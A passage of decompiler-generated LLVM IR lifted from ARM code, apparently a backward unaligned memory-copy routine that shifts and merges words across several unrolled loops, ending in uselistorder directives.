  %v0_16ee8 = phi i32 [ %v2_16e04, %dec_label_pc_16e1c ], [ %v0_16ee0, %dec_label_pc_16ee0 ]
  %v0_16ef0 = phi i32 [ %v1_16e1c, %dec_label_pc_16e1c ], [ %v1_16ee0, %dec_label_pc_16ee0 ]
  %v1_16ee8 = and i32 %v0_16ee8, -4
  store i32 %v1_16ee8, i32* %r1.global-to-local, align 4
  %v1_16eec = inttoptr i32 %v1_16ee8 to i32*
  %v2_16eec = load i32, i32* %v1_16eec, align 4
  store i32 %v2_16eec, i32* @r3, align 4
  %v7_16ef0 = icmp ult i32 %v0_16ef0, 2
  %v2_16fd4 = add i32 %v0_16fdc, -12
  %v4_16fd4 = sub i32 11, %v0_16fdc
  %v5_16fd4 = and i32 %v4_16fd4, %v0_16fdc
  %v6_16fd4 = icmp slt i32 %v5_16fd4, 0
  store i1 %v6_16fd4, i1* %cpsr_v.global-to-local, align 1
  %v7_16fd4 = icmp slt i32 %v2_16fd4, 0
  store i1 %v7_16fd4, i1* %cpsr_n.global-to-local, align 1
  %v8_16fd4 = icmp eq i32 %v0_16fdc, 12
  store i1 %v8_16fd4, i1* %cpsr_z.global-to-local, align 1
  %v5_16fd8 = icmp slt i32 %v0_16fdc, 12
  br i1 %v7_16ef0, label %dec_label_pc_16fd4, label %dec_label_pc_16ef8

dec_label_pc_16ef8:                               ; preds = %dec_label_pc_16ee8
  %v8_16ef0 = icmp eq i32 %v0_16ef0, 2
  br i1 %v8_16ef0, label %dec_label_pc_16f68, label %dec_label_pc_16efc

dec_label_pc_16efc:                               ; preds = %dec_label_pc_16ef8
  br i1 %v5_16fd8, label %dec_label_pc_16f48, label %dec_label_pc_16f04

dec_label_pc_16f04:                               ; preds = %dec_label_pc_16efc
  store i32 %v2_16fd4, i32* %r2.global-to-local, align 4
  %v3_16f08 = load i32, i32* @r4, align 4
  store i32 %v3_16f08, i32* %stack_var_-12, align 4
  %v6_16f08 = load i32, i32* @r5, align 4
  %v8_16f08 = inttoptr i32 %v6_16f08 to i8*
  store i8* %v8_16f08, i8** %stack_var_-8, align 4
  %v11_16f08 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16f0c

dec_label_pc_16f0c:                               ; preds = %dec_label_pc_16f0c.dec_label_pc_16f0c_crit_edge, %dec_label_pc_16f04
  %v0_16f30 = phi i32 [ %v1_16f30, %dec_label_pc_16f0c.dec_label_pc_16f0c_crit_edge ], [ %v0_16f3018, %dec_label_pc_16f04 ]
  %v0_16f10 = phi i32 [ %v0_16f10.pre, %dec_label_pc_16f0c.dec_label_pc_16f0c_crit_edge ], [ %v1_16ee8, %dec_label_pc_16f04 ]
  %v0_16f0c = phi i32 [ %v0_16f0c.pre, %dec_label_pc_16f0c.dec_label_pc_16f0c_crit_edge ], [ %v2_16eec, %dec_label_pc_16f04 ]
  %v3_16f0c = mul i32 %v0_16f0c, 256
  store i32 %v3_16f0c, i32* %lr.global-to-local, align 4
  %v1_16f10 = add i32 %v0_16f10, -4
  %v2_16f10 = inttoptr i32 %v1_16f10 to i32*
  %v3_16f10 = load i32, i32* %v2_16f10, align 4
  store i32 %v3_16f10, i32* @r3, align 4
  %v4_16f10 = add i32 %v0_16f10, -8
  %v5_16f10 = inttoptr i32 %v4_16f10 to i32*
  %v6_16f10 = load i32, i32* %v5_16f10, align 4
  store i32 %v6_16f10, i32* %r4.global-to-local, align 4
  %v7_16f10 = add i32 %v0_16f10, -12
  %v8_16f10 = inttoptr i32 %v7_16f10 to i32*
  %v9_16f10 = load i32, i32* %v8_16f10, align 4
  store i32 %v9_16f10, i32* %r5.global-to-local, align 4
  %v10_16f10 = add i32 %v0_16f10, -16
  %v11_16f10 = inttoptr i32 %v10_16f10 to i32*
  %v12_16f10 = load i32, i32* %v11_16f10, align 4
  store i32 %v10_16f10, i32* %r1.global-to-local, align 4
  %v4_16f14 = udiv i32 %v12_16f10, 16777216
  %v5_16f14 = or i32 %v4_16f14, %v3_16f0c
  store i32 %v5_16f14, i32* %lr.global-to-local, align 4
  %v3_16f18 = mul i32 %v12_16f10, 256
  %v4_16f1c = udiv i32 %v9_16f10, 16777216
  %v5_16f1c = or i32 %v3_16f18, %v4_16f1c
  store i32 %v5_16f1c, i32* @ip, align 4
  %v3_16f20 = mul i32 %v9_16f10, 256
  %v4_16f24 = udiv i32 %v6_16f10, 16777216
  %v5_16f24 = or i32 %v3_16f20, %v4_16f24
  store i32 %v5_16f24, i32* %r5.global-to-local, align 4
  %v3_16f28 = mul i32 %v6_16f10, 256
  %v4_16f2c = udiv i32 %v3_16f10, 16777216
  %v5_16f2c = or i32 %v3_16f28, %v4_16f2c
  store i32 %v5_16f2c, i32* %r4.global-to-local, align 4
  %v1_16f30 = add i32 %v0_16f30, -16
  %v2_16f30 = inttoptr i32 %v1_16f30 to i32*
  store i32 %v5_16f2c, i32* %v2_16f30, align 4
  %v4_16f30 = add i32 %v0_16f30, -12
  %v5_16f30 = inttoptr i32 %v4_16f30 to i32*
  %v6_16f30 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16f30, i32* %v5_16f30, align 4
  %v7_16f30 = add i32 %v0_16f30, -8
  %v8_16f30 = inttoptr i32 %v7_16f30 to i32*
  %v9_16f30 = load i32, i32* @ip, align 4
  store i32 %v9_16f30, i32* %v8_16f30, align 4
  %v10_16f30 = add i32 %v0_16f30, -4
  %v11_16f30 = inttoptr i32 %v10_16f30 to i32*
  %v12_16f30 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16f30, i32* %v11_16f30, align 4
  store i32 %v1_16f30, i32* %r0.global-to-local, align 4
  %v0_16f34 = load i32, i32* %r2.global-to-local, align 4
  %v2_16f34 = add i32 %v0_16f34, -16
  store i32 %v2_16f34, i32* %r2.global-to-local, align 4
  %v6_16f38 = icmp slt i32 %v0_16f34, 16
  br i1 %v6_16f38, label %dec_label_pc_16f3c, label %dec_label_pc_16f0c.dec_label_pc_16f0c_crit_edge

dec_label_pc_16f0c.dec_label_pc_16f0c_crit_edge:  ; preds = %dec_label_pc_16f0c
  %v0_16f0c.pre = load i32, i32* @r3, align 4
  %v0_16f10.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16f0c

dec_label_pc_16f3c:                               ; preds = %dec_label_pc_16f0c
  %v2_16f3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16f3c, i32* @r4, align 4
  %v5_16f3c = load i8*, i8** %stack_var_-8, align 4
  %v6_16f3c = ptrtoint i8* %v5_16f3c to i32
  store i32 %v6_16f3c, i32* @r5, align 4
  store i32 %v11_16f08, i32* @lr, align 4
  %v2_16f40 = add i32 %v0_16f34, -4
  store i32 %v2_16f40, i32* %r2.global-to-local, align 4
  %v4_16f40 = add i32 %v0_16f34, 2147483632
  %v5_16f40 = and i32 %v2_16f40, %v4_16f40
  %v6_16f40 = icmp slt i32 %v5_16f40, 0
  store i1 %v6_16f40, i1* %cpsr_v.global-to-local, align 1
  %v7_16f40 = icmp slt i32 %v2_16f40, 0
  store i1 %v7_16f40, i1* %cpsr_n.global-to-local, align 1
  %v8_16f40 = icmp eq i32 %v2_16f40, 0
  store i1 %v8_16f40, i1* %cpsr_z.global-to-local, align 1
  %v5_16f44 = icmp slt i32 %v2_16f34, -12
  br i1 %v5_16f44, label %dec_label_pc_16f60, label %dec_label_pc_16f48

dec_label_pc_16f48:                               ; preds = %dec_label_pc_16f3c, %dec_label_pc_16efc, %dec_label_pc_16f48
  %v1_16f54 = phi i32 [ %v5_16f54, %dec_label_pc_16f48 ], [ %v1_16f30, %dec_label_pc_16f3c ], [ %v0_16f3018, %dec_label_pc_16efc ]
  %v0_16f48 = load i32, i32* @r3, align 4
  %v3_16f48 = mul i32 %v0_16f48, 256
  store i32 %v3_16f48, i32* %ip.global-to-local, align 4
  %v0_16f4c = load i32, i32* %r1.global-to-local, align 4
  %v1_16f4c = add i32 %v0_16f4c, -4
  %v2_16f4c = inttoptr i32 %v1_16f4c to i32*
  %v3_16f4c = load i32, i32* %v2_16f4c, align 4
  store i32 %v3_16f4c, i32* @r3, align 4
  store i32 %v1_16f4c, i32* %r1.global-to-local, align 4
  %v4_16f50 = udiv i32 %v3_16f4c, 16777216
  %v5_16f50 = or i32 %v4_16f50, %v3_16f48
  store i32 %v5_16f50, i32* @ip, align 4
  %v2_16f54 = add i32 %v1_16f54, -4
  %v3_16f54 = inttoptr i32 %v2_16f54 to i32*
  store i32 %v5_16f50, i32* %v3_16f54, align 4
  %v4_16f54 = load i32, i32* %r0.global-to-local, align 4
  %v5_16f54 = add i32 %v4_16f54, -4
  store i32 %v5_16f54, i32* %r0.global-to-local, align 4
  %v0_16f58 = load i32, i32* %r2.global-to-local, align 4
  %v2_16f58 = add i32 %v0_16f58, -4
  store i32 %v2_16f58, i32* %r2.global-to-local, align 4
  %v6_16f5c = icmp slt i32 %v0_16f58, 4
  br i1 %v6_16f5c, label %dec_label_pc_16f60.loopexit, label %dec_label_pc_16f48

dec_label_pc_16f60.loopexit:                      ; preds = %dec_label_pc_16f48
  %v4_16f58 = sub i32 3, %v0_16f58
  %v5_16f58 = and i32 %v4_16f58, %v0_16f58
  %v6_16f58 = icmp slt i32 %v5_16f58, 0
  %v7_16f58 = icmp slt i32 %v2_16f58, 0
  store i1 %v6_16f58, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16f58, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16f60

dec_label_pc_16f60:                               ; preds = %dec_label_pc_16f60.loopexit, %dec_label_pc_16f3c
  %v2_16ea450 = phi i32 [ %v5_16f54, %dec_label_pc_16f60.loopexit ], [ %v1_16f30, %dec_label_pc_16f3c ]
  %v0_16e9446 = phi i32 [ %v2_16f58, %dec_label_pc_16f60.loopexit ], [ %v2_16f40, %dec_label_pc_16f3c ]
  %v0_16f60 = load i32, i32* %r1.global-to-local, align 4
  %v1_16f60 = add i32 %v0_16f60, 3
  store i32 %v1_16f60, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_16f68:                               ; preds = %dec_label_pc_16ef8
  br i1 %v5_16fd8, label %dec_label_pc_16fb4, label %dec_label_pc_16f70

dec_label_pc_16f70:                               ; preds = %dec_label_pc_16f68
  store i32 %v2_16fd4, i32* %r2.global-to-local, align 4
  %v3_16f74 = load i32, i32* @r4, align 4
  store i32 %v3_16f74, i32* %stack_var_-12, align 4
  %v6_16f74 = load i32, i32* @r5, align 4
  %v8_16f74 = inttoptr i32 %v6_16f74 to i8*
  store i8* %v8_16f74, i8** %stack_var_-8, align 4
  %v11_16f74 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16f78

dec_label_pc_16f78:                               ; preds = %dec_label_pc_16f78.dec_label_pc_16f78_crit_edge, %dec_label_pc_16f70
  %v0_16f9c = phi i32 [ %v1_16f9c, %dec_label_pc_16f78.dec_label_pc_16f78_crit_edge ], [ %v0_16f3018, %dec_label_pc_16f70 ]
  %v0_16f7c = phi i32 [ %v0_16f7c.pre, %dec_label_pc_16f78.dec_label_pc_16f78_crit_edge ], [ %v1_16ee8, %dec_label_pc_16f70 ]
  %v0_16f78 = phi i32 [ %v0_16f78.pre, %dec_label_pc_16f78.dec_label_pc_16f78_crit_edge ], [ %v2_16eec, %dec_label_pc_16f70 ]
  %v3_16f78 = mul i32 %v0_16f78, 65536
  store i32 %v3_16f78, i32* %lr.global-to-local, align 4
  %v1_16f7c = add i32 %v0_16f7c, -4
  %v2_16f7c = inttoptr i32 %v1_16f7c to i32*
  %v3_16f7c = load i32, i32* %v2_16f7c, align 4
  store i32 %v3_16f7c, i32* @r3, align 4
  %v4_16f7c = add i32 %v0_16f7c, -8
  %v5_16f7c = inttoptr i32 %v4_16f7c to i32*
  %v6_16f7c = load i32, i32* %v5_16f7c, align 4
  store i32 %v6_16f7c, i32* %r4.global-to-local, align 4
  %v7_16f7c = add i32 %v0_16f7c, -12
  %v8_16f7c = inttoptr i32 %v7_16f7c to i32*
  %v9_16f7c = load i32, i32* %v8_16f7c, align 4
  store i32 %v9_16f7c, i32* %r5.global-to-local, align 4
  %v10_16f7c = add i32 %v0_16f7c, -16
  %v11_16f7c = inttoptr i32 %v10_16f7c to i32*
  %v12_16f7c = load i32, i32* %v11_16f7c, align 4
  store i32 %v10_16f7c, i32* %r1.global-to-local, align 4
  %v4_16f80 = udiv i32 %v12_16f7c, 65536
  %v5_16f80 = or i32 %v4_16f80, %v3_16f78
  store i32 %v5_16f80, i32* %lr.global-to-local, align 4
  %v3_16f84 = mul i32 %v12_16f7c, 65536
  %v4_16f88 = udiv i32 %v9_16f7c, 65536
  %v5_16f88 = or i32 %v3_16f84, %v4_16f88
  store i32 %v5_16f88, i32* @ip, align 4
  %v3_16f8c = mul i32 %v9_16f7c, 65536
  %v4_16f90 = udiv i32 %v6_16f7c, 65536
  %v5_16f90 = or i32 %v3_16f8c, %v4_16f90
  store i32 %v5_16f90, i32* %r5.global-to-local, align 4
  %v3_16f94 = mul i32 %v6_16f7c, 65536
  %v4_16f98 = udiv i32 %v3_16f7c, 65536
  %v5_16f98 = or i32 %v3_16f94, %v4_16f98
  store i32 %v5_16f98, i32* %r4.global-to-local, align 4
  %v1_16f9c = add i32 %v0_16f9c, -16
  %v2_16f9c = inttoptr i32 %v1_16f9c to i32*
  store i32 %v5_16f98, i32* %v2_16f9c, align 4
  %v4_16f9c = add i32 %v0_16f9c, -12
  %v5_16f9c = inttoptr i32 %v4_16f9c to i32*
  %v6_16f9c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16f9c, i32* %v5_16f9c, align 4
  %v7_16f9c = add i32 %v0_16f9c, -8
  %v8_16f9c = inttoptr i32 %v7_16f9c to i32*
  %v9_16f9c = load i32, i32* @ip, align 4
  store i32 %v9_16f9c, i32* %v8_16f9c, align 4
  %v10_16f9c = add i32 %v0_16f9c, -4
  %v11_16f9c = inttoptr i32 %v10_16f9c to i32*
  %v12_16f9c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16f9c, i32* %v11_16f9c, align 4
  store i32 %v1_16f9c, i32* %r0.global-to-local, align 4
  %v0_16fa0 = load i32, i32* %r2.global-to-local, align 4
  %v2_16fa0 = add i32 %v0_16fa0, -16
  store i32 %v2_16fa0, i32* %r2.global-to-local, align 4
  %v6_16fa4 = icmp slt i32 %v0_16fa0, 16
  br i1 %v6_16fa4, label %dec_label_pc_16fa8, label %dec_label_pc_16f78.dec_label_pc_16f78_crit_edge

dec_label_pc_16f78.dec_label_pc_16f78_crit_edge:  ; preds = %dec_label_pc_16f78
  %v0_16f78.pre = load i32, i32* @r3, align 4
  %v0_16f7c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16f78

dec_label_pc_16fa8:                               ; preds = %dec_label_pc_16f78
  %v2_16fa8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16fa8, i32* @r4, align 4
  %v5_16fa8 = load i8*, i8** %stack_var_-8, align 4
  %v6_16fa8 = ptrtoint i8* %v5_16fa8 to i32
  store i32 %v6_16fa8, i32* @r5, align 4
  store i32 %v11_16f74, i32* @lr, align 4
  %v2_16fac = add i32 %v0_16fa0, -4
  store i32 %v2_16fac, i32* %r2.global-to-local, align 4
  %v4_16fac = add i32 %v0_16fa0, 2147483632
  %v5_16fac = and i32 %v2_16fac, %v4_16fac
  %v6_16fac = icmp slt i32 %v5_16fac, 0
  store i1 %v6_16fac, i1* %cpsr_v.global-to-local, align 1
  %v7_16fac = icmp slt i32 %v2_16fac, 0
  store i1 %v7_16fac, i1* %cpsr_n.global-to-local, align 1
  %v8_16fac = icmp eq i32 %v2_16fac, 0
  store i1 %v8_16fac, i1* %cpsr_z.global-to-local, align 1
  %v5_16fb0 = icmp slt i32 %v2_16fa0, -12
  br i1 %v5_16fb0, label %dec_label_pc_16fcc, label %dec_label_pc_16fb4

dec_label_pc_16fb4:                               ; preds = %dec_label_pc_16fa8, %dec_label_pc_16f68, %dec_label_pc_16fb4
  %v1_16fc0 = phi i32 [ %v5_16fc0, %dec_label_pc_16fb4 ], [ %v1_16f9c, %dec_label_pc_16fa8 ], [ %v0_16f3018, %dec_label_pc_16f68 ]
  %v0_16fb4 = load i32, i32* @r3, align 4
  %v3_16fb4 = mul i32 %v0_16fb4, 65536
  store i32 %v3_16fb4, i32* %ip.global-to-local, align 4
  %v0_16fb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16fb8 = add i32 %v0_16fb8, -4
  %v2_16fb8 = inttoptr i32 %v1_16fb8 to i32*
  %v3_16fb8 = load i32, i32* %v2_16fb8, align 4
  store i32 %v3_16fb8, i32* @r3, align 4
  store i32 %v1_16fb8, i32* %r1.global-to-local, align 4
  %v4_16fbc = udiv i32 %v3_16fb8, 65536
  %v5_16fbc = or i32 %v4_16fbc, %v3_16fb4
  store i32 %v5_16fbc, i32* @ip, align 4
  %v2_16fc0 = add i32 %v1_16fc0, -4
  %v3_16fc0 = inttoptr i32 %v2_16fc0 to i32*
  store i32 %v5_16fbc, i32* %v3_16fc0, align 4
  %v4_16fc0 = load i32, i32* %r0.global-to-local, align 4
  %v5_16fc0 = add i32 %v4_16fc0, -4
  store i32 %v5_16fc0, i32* %r0.global-to-local, align 4
  %v0_16fc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_16fc4 = add i32 %v0_16fc4, -4
  store i32 %v2_16fc4, i32* %r2.global-to-local, align 4
  %v6_16fc8 = icmp slt i32 %v0_16fc4, 4
  br i1 %v6_16fc8, label %dec_label_pc_16fcc.loopexit, label %dec_label_pc_16fb4

dec_label_pc_16fcc.loopexit:                      ; preds = %dec_label_pc_16fb4
  %v4_16fc4 = sub i32 3, %v0_16fc4
  %v5_16fc4 = and i32 %v4_16fc4, %v0_16fc4
  %v6_16fc4 = icmp slt i32 %v5_16fc4, 0
  %v7_16fc4 = icmp slt i32 %v2_16fc4, 0
  store i1 %v6_16fc4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16fc4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16fcc

dec_label_pc_16fcc:                               ; preds = %dec_label_pc_16fcc.loopexit, %dec_label_pc_16fa8
  %v2_16ea451 = phi i32 [ %v5_16fc0, %dec_label_pc_16fcc.loopexit ], [ %v1_16f9c, %dec_label_pc_16fa8 ]
  %v0_16e9447 = phi i32 [ %v2_16fc4, %dec_label_pc_16fcc.loopexit ], [ %v2_16fac, %dec_label_pc_16fa8 ]
  %v0_16fcc = load i32, i32* %r1.global-to-local, align 4
  %v1_16fcc = add i32 %v0_16fcc, 2
  store i32 %v1_16fcc, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_16fd4:                               ; preds = %dec_label_pc_16ee8
  br i1 %v5_16fd8, label %dec_label_pc_17020, label %dec_label_pc_16fdc

dec_label_pc_16fdc:                               ; preds = %dec_label_pc_16fd4
  store i32 %v2_16fd4, i32* %r2.global-to-local, align 4
  %v3_16fe0 = load i32, i32* @r4, align 4
  store i32 %v3_16fe0, i32* %stack_var_-12, align 4
  %v6_16fe0 = load i32, i32* @r5, align 4
  %v8_16fe0 = inttoptr i32 %v6_16fe0 to i8*
  store i8* %v8_16fe0, i8** %stack_var_-8, align 4
  %v11_16fe0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16fe4

dec_label_pc_16fe4:                               ; preds = %dec_label_pc_16fe4.dec_label_pc_16fe4_crit_edge, %dec_label_pc_16fdc
  %v0_17008 = phi i32 [ %v1_17008, %dec_label_pc_16fe4.dec_label_pc_16fe4_crit_edge ], [ %v0_16f3018, %dec_label_pc_16fdc ]
  %v0_16fe8 = phi i32 [ %v0_16fe8.pre, %dec_label_pc_16fe4.dec_label_pc_16fe4_crit_edge ], [ %v1_16ee8, %dec_label_pc_16fdc ]
  %v0_16fe4 = phi i32 [ %v0_16fe4.pre, %dec_label_pc_16fe4.dec_label_pc_16fe4_crit_edge ], [ %v2_16eec, %dec_label_pc_16fdc ]
  %v3_16fe4 = mul i32 %v0_16fe4, 16777216
  store i32 %v3_16fe4, i32* %lr.global-to-local, align 4
  %v1_16fe8 = add i32 %v0_16fe8, -4
  %v2_16fe8 = inttoptr i32 %v1_16fe8 to i32*
  %v3_16fe8 = load i32, i32* %v2_16fe8, align 4
  store i32 %v3_16fe8, i32* @r3, align 4
  %v4_16fe8 = add i32 %v0_16fe8, -8
  %v5_16fe8 = inttoptr i32 %v4_16fe8 to i32*
  %v6_16fe8 = load i32, i32* %v5_16fe8, align 4
  store i32 %v6_16fe8, i32* %r4.global-to-local, align 4
  %v7_16fe8 = add i32 %v0_16fe8, -12
  %v8_16fe8 = inttoptr i32 %v7_16fe8 to i32*
  %v9_16fe8 = load i32, i32* %v8_16fe8, align 4
  store i32 %v9_16fe8, i32* %r5.global-to-local, align 4
  %v10_16fe8 = add i32 %v0_16fe8, -16
  %v11_16fe8 = inttoptr i32 %v10_16fe8 to i32*
  %v12_16fe8 = load i32, i32* %v11_16fe8, align 4
  store i32 %v10_16fe8, i32* %r1.global-to-local, align 4
  %v4_16fec = udiv i32 %v12_16fe8, 256
  %v5_16fec = or i32 %v4_16fec, %v3_16fe4
  store i32 %v5_16fec, i32* %lr.global-to-local, align 4
  %v3_16ff0 = mul i32 %v12_16fe8, 16777216
  %v4_16ff4 = udiv i32 %v9_16fe8, 256
  %v5_16ff4 = or i32 %v3_16ff0, %v4_16ff4
  store i32 %v5_16ff4, i32* @ip, align 4
  %v3_16ff8 = mul i32 %v9_16fe8, 16777216
  %v4_16ffc = udiv i32 %v6_16fe8, 256
  %v5_16ffc = or i32 %v3_16ff8, %v4_16ffc
  store i32 %v5_16ffc, i32* %r5.global-to-local, align 4
  %v3_17000 = mul i32 %v6_16fe8, 16777216
  %v4_17004 = udiv i32 %v3_16fe8, 256
  %v5_17004 = or i32 %v3_17000, %v4_17004
  store i32 %v5_17004, i32* %r4.global-to-local, align 4
  %v1_17008 = add i32 %v0_17008, -16
  %v2_17008 = inttoptr i32 %v1_17008 to i32*
  store i32 %v5_17004, i32* %v2_17008, align 4
  %v4_17008 = add i32 %v0_17008, -12
  %v5_17008 = inttoptr i32 %v4_17008 to i32*
  %v6_17008 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_17008, i32* %v5_17008, align 4
  %v7_17008 = add i32 %v0_17008, -8
  %v8_17008 = inttoptr i32 %v7_17008 to i32*
  %v9_17008 = load i32, i32* @ip, align 4
  store i32 %v9_17008, i32* %v8_17008, align 4
  %v10_17008 = add i32 %v0_17008, -4
  %v11_17008 = inttoptr i32 %v10_17008 to i32*
  %v12_17008 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17008, i32* %v11_17008, align 4
  store i32 %v1_17008, i32* %r0.global-to-local, align 4
  %v0_1700c = load i32, i32* %r2.global-to-local, align 4
  %v2_1700c = add i32 %v0_1700c, -16
  store i32 %v2_1700c, i32* %r2.global-to-local, align 4
  %v6_17010 = icmp slt i32 %v0_1700c, 16
  br i1 %v6_17010, label %dec_label_pc_17014, label %dec_label_pc_16fe4.dec_label_pc_16fe4_crit_edge

dec_label_pc_16fe4.dec_label_pc_16fe4_crit_edge:  ; preds = %dec_label_pc_16fe4
  %v0_16fe4.pre = load i32, i32* @r3, align 4
  %v0_16fe8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16fe4

dec_label_pc_17014:                               ; preds = %dec_label_pc_16fe4
  %v2_17014 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17014, i32* @r4, align 4
  %v5_17014 = load i8*, i8** %stack_var_-8, align 4
  %v6_17014 = ptrtoint i8* %v5_17014 to i32
  store i32 %v6_17014, i32* @r5, align 4
  store i32 %v11_16fe0, i32* @lr, align 4
  %v2_17018 = add i32 %v0_1700c, -4
  store i32 %v2_17018, i32* %r2.global-to-local, align 4
  %v4_17018 = add i32 %v0_1700c, 2147483632
  %v5_17018 = and i32 %v2_17018, %v4_17018
  %v6_17018 = icmp slt i32 %v5_17018, 0
  store i1 %v6_17018, i1* %cpsr_v.global-to-local, align 1
  %v7_17018 = icmp slt i32 %v2_17018, 0
  store i1 %v7_17018, i1* %cpsr_n.global-to-local, align 1
  %v8_17018 = icmp eq i32 %v2_17018, 0
  store i1 %v8_17018, i1* %cpsr_z.global-to-local, align 1
  %v5_1701c = icmp slt i32 %v2_1700c, -12
  br i1 %v5_1701c, label %dec_label_pc_17038, label %dec_label_pc_17020

dec_label_pc_17020:                               ; preds = %dec_label_pc_17014, %dec_label_pc_16fd4, %dec_label_pc_17020
  %v1_1702c = phi i32 [ %v5_1702c, %dec_label_pc_17020 ], [ %v1_17008, %dec_label_pc_17014 ], [ %v0_16f3018, %dec_label_pc_16fd4 ]
  %v0_17020 = load i32, i32* @r3, align 4
  %v3_17020 = mul i32 %v0_17020, 16777216
  store i32 %v3_17020, i32* %ip.global-to-local, align 4
  %v0_17024 = load i32, i32* %r1.global-to-local, align 4
  %v1_17024 = add i32 %v0_17024, -4
  %v2_17024 = inttoptr i32 %v1_17024 to i32*
  %v3_17024 = load i32, i32* %v2_17024, align 4
  store i32 %v3_17024, i32* @r3, align 4
  store i32 %v1_17024, i32* %r1.global-to-local, align 4
  %v4_17028 = udiv i32 %v3_17024, 256
  %v5_17028 = or i32 %v4_17028, %v3_17020
  store i32 %v5_17028, i32* @ip, align 4
  %v2_1702c = add i32 %v1_1702c, -4
  %v3_1702c = inttoptr i32 %v2_1702c to i32*
  store i32 %v5_17028, i32* %v3_1702c, align 4
  %v4_1702c = load i32, i32* %r0.global-to-local, align 4
  %v5_1702c = add i32 %v4_1702c, -4
  store i32 %v5_1702c, i32* %r0.global-to-local, align 4
  %v0_17030 = load i32, i32* %r2.global-to-local, align 4
  %v2_17030 = add i32 %v0_17030, -4
  store i32 %v2_17030, i32* %r2.global-to-local, align 4
  %v6_17034 = icmp slt i32 %v0_17030, 4
  br i1 %v6_17034, label %dec_label_pc_17038.loopexit, label %dec_label_pc_17020

dec_label_pc_17038.loopexit:                      ; preds = %dec_label_pc_17020
  %v4_17030 = sub i32 3, %v0_17030
  %v5_17030 = and i32 %v4_17030, %v0_17030
  %v6_17030 = icmp slt i32 %v5_17030, 0
  %v7_17030 = icmp slt i32 %v2_17030, 0
  store i1 %v6_17030, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17030, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17038

dec_label_pc_17038:                               ; preds = %dec_label_pc_17038.loopexit, %dec_label_pc_17014
  %v2_16ea452 = phi i32 [ %v5_1702c, %dec_label_pc_17038.loopexit ], [ %v1_17008, %dec_label_pc_17014 ]
  %v0_16e9448 = phi i32 [ %v2_17030, %dec_label_pc_17038.loopexit ], [ %v2_17018, %dec_label_pc_17014 ]
  %v0_17038 = load i32, i32* %r1.global-to-local, align 4
  %v1_17038 = add i32 %v0_17038, 1
  store i32 %v1_17038, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1702c, { 0, 2, 1 }
  uselistorder i32 %v3_17020, { 1, 0 }
  uselistorder i32 %v2_17018, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_17008, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16fe8, { 1, 0 }
  uselistorder i32 %v3_16fe4, { 1, 0 }
  uselistorder i32 %v0_16fe8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17008, { 3, 2, 1, 0 }
  uselistorder i32 %v5_16fc0, { 0, 2, 1 }
  uselistorder i32 %v3_16fb4, { 1, 0 }
  uselistorder i32 %v2_16fac, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16f9c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16f7c, { 1, 0 }
  uselistorder i32 %v3_16f78, { 1, 0 }
  uselistorder i32 %v0_16f7c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16f9c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_16f54, { 0, 2, 1 }
  uselistorder i32 %v3_16f48, { 1, 0 }
  uselistorder i32 %v2_16f40, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16f30, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16f10, { 1, 0 }
  uselistorder i32 %v3_16f0c, { 1, 0 }
  uselistorder i32 %v0_16f10, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16f30, { 3, 2, 1, 0 }
  uselistorder i1 %v5_16fd8, { 2, 0, 1 }
  uselistorder i32 %v0_16ef0, { 1, 0 }
  uselistorder i32 %v0_16fdc, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_16f3018, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_16ee0, { 2, 1, 0 }
  uselistorder i32 %v0_16ee0, { 2, 0, 1 }
  uselistorder i32 %v2_16ed8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_16ed8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16ed8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_16f3019, { 2, 1, 0 }
  uselistorder i32 %v11_16eb4, { 1, 0 }
  uselistorder i32 %v7_16eb4, { 1, 0 }
  uselistorder i32 %v1_16e94, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_16e94, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16e98, { 1, 0 }
  uselistorder i32 %v7_16e8c, { 0, 2, 1 }
  uselistorder i32 %v10_16e88, { 1, 0 }
  uselistorder i32 %v9_16e80, { 1, 0, 2 }
  uselistorder i32 %v6_16e7c, { 1, 0 }
